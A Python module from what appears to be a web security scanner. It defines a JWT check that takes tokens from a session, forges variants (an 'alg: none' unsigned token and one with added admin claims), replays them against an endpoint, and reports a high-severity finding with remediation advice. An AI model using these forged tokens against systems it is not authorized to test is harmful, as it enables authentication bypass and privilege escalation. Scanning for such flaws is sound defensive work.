from __future__ import annotations

import base64
import json
from typing import AsyncIterator
from .base import Check, Endpoint, Finding
from .common import more_access, poc


def _token_sources(session) -> list[str]:
    headers = getattr(session, "headers", {}) or {}
    tokens = []
    auth = headers.get("Authorization") or headers.get("authorization")
    if auth and auth.lower().startswith("bearer "):
        tokens.append(auth.split(None, 1)[1])
    for cookie in getattr(session, "cookies", []) or []:
        value = str(cookie.get("value", ""))
        if value.count(".") == 2 and value.startswith("eyJ"):
            tokens.append(value)
    return tokens


class JWTCheck(Check):
    name = "jwt"
    description = "JWT mutation checks against authenticated endpoints."

    async def run(self, endpoint: Endpoint, session, replay) -> AsyncIterator[Finding]:
        tokens = _token_sources(session)
        if not tokens:
            return
        baseline = await replay.baseline(endpoint)
        for token in tokens[:1]:
            for mutated in _mutations(token):
                request = replay.injector.build(endpoint, {"location": "header", "name": "Authorization"}, f"Bearer {mutated}")
                resp = await replay.replay(request)
                if more_access(baseline, resp):
                    yield Finding("jwt", "high", "medium", "JWT mutation accepted", "A tampered JWT appeared to preserve or gain access on an authenticated endpoint.", {"sub_technique": "jwt_mutation", "status": resp.status_code}, poc(endpoint), "Reject unsigned/tampered tokens and validate algorithm, signature, issuer, audience, and authorization claims.")
                    return


def _mutations(token: str) -> list[str]:
    parts = token.split(".")
    if len(parts) != 3:
        return []
    try:
        payload = json.loads(_b64decode(parts[1]))
    except Exception:
        payload = {}
    header_none = _b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    admin_payload = dict(payload); admin_payload.update({"role": "admin", "admin": True, "isAdmin": True})
    return [f"{header_none}.{parts[1]}.", f"{parts[0]}.{_b64encode(json.dumps(admin_payload).encode())}.{parts[2]}"]


def _b64decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def _b64encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode().rstrip("=")
